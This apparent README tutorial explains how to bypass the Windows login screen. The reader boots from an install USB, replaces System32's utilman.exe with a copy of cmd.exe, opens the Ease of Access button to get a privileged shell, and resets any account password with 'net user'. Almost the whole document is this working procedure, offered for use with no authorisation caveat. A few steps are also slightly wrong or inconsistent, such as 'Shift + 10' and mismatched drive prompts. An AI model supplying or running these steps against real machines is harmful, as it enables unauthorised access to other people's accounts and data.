<h1 align="center">Bypass Windows Login Screen</h1>


## Explaination
We are trying to access CMD so that we can change the Username, Password without Logging in. So, We used Bootable USB: As we can access temporary CMD from there and there is also a way in Windows 10 via Troubleshooting but that's not possible for all Window User.

So after opening CMD we perform some steps like searching for System Files present in our main computer by checking each drive then after searching we go to the System32 Folder and there we contain our utilman.exe and cmd.exe File. So we make a copy of utilman.exe and then changed utilman.exe as cmd.exe. As if we execute utilman.exe file, then cmd.exe will get executed. And utilman.exe is one and only ""Ease of Access"" which is present at the bottom right in Windows. So, after changing that and starting our Windows normally. We can tap of ""Ease of Access"" and cmd.exe will get executed and we can use out short script for which we were waiting for.
net user username password -> this will change out password for particular account without any problem.

## Requirement

A Computer, Bootable USB for Windows 10

## Steps

1. Restart and boot from Pendrive and after Install Screen appears then hit Shift + 10 and CMD will open up.

2. X: \Sources>
```bash
wmic logicaldisk get name
```

Output:
    Name
    C:
    D:
    E:
    X:


3. X: \Sources>
```bash
C:
#the directory which comtains your system files
```


4. C: \>
```bash
dir
```

Output:
Volume in drive C is System Reserved
Volume Serial Number is 56E1-426F

Directory of C:\
    File Not Found


5. E: \>
```bash
D:
```


6. D: \>
```bash
cd Windows
```


7. D: \Windows>
```bash
cd System32
```


8. D: \Windows\System32>
```bash
ren utilman.exe utilman2.exe
```


9. D: \Windows\System32>
```bash
copy cmd.exe utilman.exe
```


10. Click Ease of Access - cmd will open

11. net user username password
